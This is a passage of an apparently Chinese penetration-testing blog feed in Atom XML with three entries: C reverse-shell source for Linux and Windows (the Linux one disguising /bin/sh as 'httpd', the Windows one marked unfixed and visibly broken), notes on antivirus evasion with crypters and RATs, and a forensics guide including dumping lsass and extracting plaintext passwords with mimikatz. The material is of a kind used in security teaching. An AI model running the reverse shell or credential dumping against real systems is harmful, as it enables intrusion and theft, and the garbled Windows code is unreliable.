htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">dup2(s,<span class="number">0</span>);</span><br><span class="line">dup2(s,<span class="number">1</span>);</span><br><span class="line">dup2(s,<span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>windows.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOOKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line"><span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"><span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>) </span><br><span class="line">&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line"><span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">hax.sin_family = AF_INET;</span><br><span class="line">hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;生成反弹shell&quot;&gt;&lt;a href=&quot;#生成反弹shell&quot; class=&quot;headerlink&quot; title=&quot;生成反弹shell&quot;&gt;&lt;/a&gt;&lt;strong&gt;生成反弹shell&lt;/strong&gt;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p windo
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
    
      <category term="strings" scheme="http://c.cat.plus/tags/strings/"/>
    
      <category term="C" scheme="http://c.cat.plus/tags/C/"/>
    
      <category term="gcc" scheme="http://c.cat.plus/tags/gcc/"/>
    
      <category term="wine" scheme="http://c.cat.plus/tags/wine/"/>
    
  </entry>
  
  <entry>
    <title>恶意程序及免杀技术现状</title>
    <link href="http://c.cat.plus/2016/08/03/Avoid_Killing/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%8E%B0%E7%8A%B6/"/>
    <id>http://c.cat.plus/2016/08/03/Avoid_Killing/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%8E%B0%E7%8A%B6/</id>
    <published>2016-08-03T09:15:31.000Z</published>
    <updated>2020-06-10T08:31:40.420Z</updated>
    
    <content type="html"><![CDATA[<h4 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a><strong>恶意软件</strong></h4><ul><li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li><li>在用户非自愿的情况下执行安装</li><li>出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…</li></ul><h4 id="防病毒软件"><a href="#防病毒软件" class="headerlink" title="防病毒软件"></a><strong>防病毒软件</strong></h4><ul><li><p>恶意程序最主要的防护手段</p><p>  杀毒软件/防病毒软件<br>  客户端/服务器/邮件防病毒</p></li><li><p>检测原理</p><p>  基于二进制文件中特种签名的黑名单检测方法<br>  于行为的分析方法(启发式)</p></li><li><p>事后手段</p><p>  永远落后于病毒发展</p></li></ul><h4 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a><strong>免杀技术</strong></h4><ul><li><p>修改二进制文件中的特征字符</p><p>  替换、擦除、修改</p></li><li><p>加密技术(crypter)</p><p>  通过加密使得特征字符不可读,从而逃避AV检测<br>  运行时分片分段的解密执行,注入进程或AV不检查的无害文件中</p></li><li><p>防病毒软件的检测</p><p>  恶意程序本身的特征字符<br>  加密器crypter的特征字符</p></li></ul><blockquote><h3 id="当前现状"><a href="#当前现状" class="headerlink" title="当前现状"></a><strong>当前现状</strong></h3></blockquote><p><strong>恶意软件制造者</strong></p><ul><li>编写私有RAT软件,避免普遍被AV所知的特征字符</li><li>使用独有crypter软件加密恶意程序</li><li>处事低调，尽量避免被发现</li><li>没有能力自己编写而已代码的黑客,通过直接修改特征码的方式免杀</li><li>Fully UnDetectable是最高追求(FUD)</li></ul><p><strong>AV厂商</strong></p><ul><li>广泛采集样本,尽快发现新出现的而已程序,更新病毒库</li><li>一般新的恶意软件安全UD窗口期是一周左右</li><li>与恶意软件制造者永无休止的拉锯战</li><li>新的启发式检测技术尚有待完善(误杀漏杀)</li></ul><p><strong>单一AV广商的病毒库很难达到100%覆盖</strong></p><ul><li><p><code>https://www.virustotal.com/</code><br>  接口被某些国家的AV软件免费利用，没有自己的病毒库</p></li><li><p><code>http://www.virscan.org/</code></p></li><li><p>在线多引擎查杀网站与AV厂商共享信息</p></li><li><p>搞黑的在线多引擎查毒站</p></li><li><p><code>https://nodistribute.com/</code></p></li><li><p><code>http://viruscheckmate.com/check/</code></p></li></ul><p><strong>常用RAT软件</strong></p><ul><li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li></ul><h4 id="NanoCore-Bate-Release"><a href="#NanoCore-Bate-Release" class="headerlink" title="NanoCore - Bate Release"></a><strong>NanoCore</strong> - Bate Release</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;恶意软件&quot;&gt;&lt;a href=&quot;#恶意软件&quot; class=&quot;headerlink&quot; title=&quot;恶意软件&quot;&gt;&lt;/a&gt;&lt;strong&gt;恶意软件&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序&lt;/li&gt;

      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="RAT" scheme="http://c.cat.plus/tags/RAT/"/>
    
      <category term="NanoCore" scheme="http://c.cat.plus/tags/NanoCore/"/>
    
      <category term="crypter" scheme="http://c.cat.plus/tags/crypter/"/>
    
  </entry>
  
  <entry>
    <title>活取证和死取证</title>
    <link href="http://c.cat.plus/2016/05/12/Forensics/%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/"/>
    <id>http://c.cat.plus/2016/05/12/Forensics/%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/</id>
    <published>2016-05-12T13:23:53.000Z</published>
    <updated>2020-07-10T08:20:59.849Z</updated>
    
    <content type="html"><![CDATA[<h4 id="活取证"><a href="#活取证" class="headerlink" title="活取证"></a><strong>活取证</strong></h4><ul><li><p><strong>从内存还原文字</strong></p><ul><li><code>https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx</code>        #procdump</li><li><code>https://technet.microsoft.com/en-us/sysinternals/bb897439.aspx</code>        #Windows下的strings工具  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump -ma notepad.exe notepad.dmp</span><br><span class="line">strings notepad.dmp &gt; notepad.txt</span><br></pre></td></tr></table></figure></li><li>其它文字处理程序也适用</li></ul></li><li><p><strong>从内存还原图片</strong></p><ul><li>远程桌面,画图工具,Virtualbox虚拟机<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 7.raw --profile&#x3D;Win7SP1x64 memdump -p 1456 -D test</span><br><span class="line">apt-get install gimp#kali安装gimp图片处理工具,媲美windows的PS</span><br><span class="line">mv mstsc.dmp mstsc.data#更改dmp文件格式</span><br><span class="line">gimp -&gt; open -&gt; Raw Image Data -&gt; 调整参数</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>从内存中提取明文密码</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procdump -ma lsass.exe lsass.dmp#dump lsass.exe在内存文件,任何windows版本登录后都会启动lsass.exe进程,用于保存密码</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;share&#x2F;windows-resources&#x2F;mimikatz&#x2F;x64#mimikatz win64版kali所在路径</span><br><span class="line"></span><br><span class="line">Mimikatz#使用mimikatz </span><br><span class="line"></span><br><span class="line">sekurlsa::minidump lsass.dmp#load 内存文件</span><br><span class="line"></span><br><span class="line">sekurlsa::logonPasswords#提取 dump文件的身份认证信息</span><br></pre></td></tr></table></figure><ul><li><p>Volatility 的 mimikatz 插件</p><ul><li><code>https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py</code></li><li><code>volatility -f 7.raw imageinfo</code></li><li><code>volatility -f 7.raw --profile=Win7SP1x64 mimikatz</code></li></ul></li><li><p>Firefox 浏览器审计工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install dumpzilla</span><br><span class="line">dumpzilla &#x2F;root&#x2F;.mozilla&#x2F;firefox&#x2F;ugyw3gav.default&#x2F; --All</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="死取证"><a href="#死取证" class="headerlink" title="死取证"></a><strong>死取证</strong></h4><ul><li><p><strong>硬盘镜像</strong></p><ul><li>使用kali光盘启动计算机创建硬盘镜像文件</li><li>留足存储镜像文件的存储空间</li><li>dc3dd 传说来自美国空军计算机犯罪中心开发</li><li>dcfldd</li><li>guymager        #图形化dd工具</li><li>计算机取证技术参考数据集<ul><li><code>http://www.cfreds.nist.gov/Controlv1_0/control.dd</code></li></ul></li></ul></li><li><p><strong>DFF</strong> (Digital Forensics Framework)</p><ul><li>数字取证框架</li><li>kali2.0版本后被移出</li><li>支持命令行和友好图形化界面</li><li>Open Evidence        #红色表示已经删除的文件</li><li>发现恢复已经删除和隐藏的文件</li></ul></li><li><p><strong>Autopsy</strong></p><ul><li>非常流行的硬盘镜像分析工具</li><li>WebServer + 客户端架构</li></ul></li><li><p><strong>Extundelete</strong></p><ul><li>适用于ext3,ext4文件系统的反删除工具</li><li><code>Extundelete [device-file] --restore-file [restore location]</code></li></ul></li><li><p><strong>iPhone Backup Analyzer</strong></p><ul><li>分析iTunes 生成的iPhone 手机备份文件,并非电话image</li></ul></li><li><p><strong>Foremost</strong> (美国政府开发)</p><ul><li>从内存dump中恢复文档图片,支持raw,dd,iso,vmem等格式</li><li><code>foremost -t jpeg,gif,png,doc -i 7.raw</code></li></ul></li></ul><h4 id="网络取证"><a href="#网络取证" class="headerlink" title="网络取证"></a><strong>网络取证</strong></h4><ul><li>各种抓包dump分析</li><li>全流量镜像可还原历史</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;活取证&quot;&gt;&lt;a href=&quot;#活取证&quot; class=&quot;headerlink&quot; title=&quot;活取证&quot;&gt;&lt;/a&gt;&lt;strong&gt;活取证&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;从内存还原文字&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;c
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="数字取证" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/"/>
    
    
      <category term="strings" scheme="http://c.cat.plus/tags/strings/"/>
    
      <category term="mimikatz" scheme="http://c.cat.plus/tags/mimikatz/"/>
    
      <category term="volatility" scheme="http://c.cat.plus/tags/volatility/"/>
    
      <category term="活取证" scheme="http://c.cat.plus/tags/%E6%B4%BB%E5%8F%96%E8%AF%81/"/>
    
      <category term="procdump" scheme="http://c.cat.plus/tags/procdump/"/>
    
      <category term="gimp" scheme="http://c.cat.plus/tags/gimp/"/>
    
      <category term="dc3dd" scheme="http://c.cat.plus/tags/dc3dd/"/>
    
  </entry>
  
</feed>
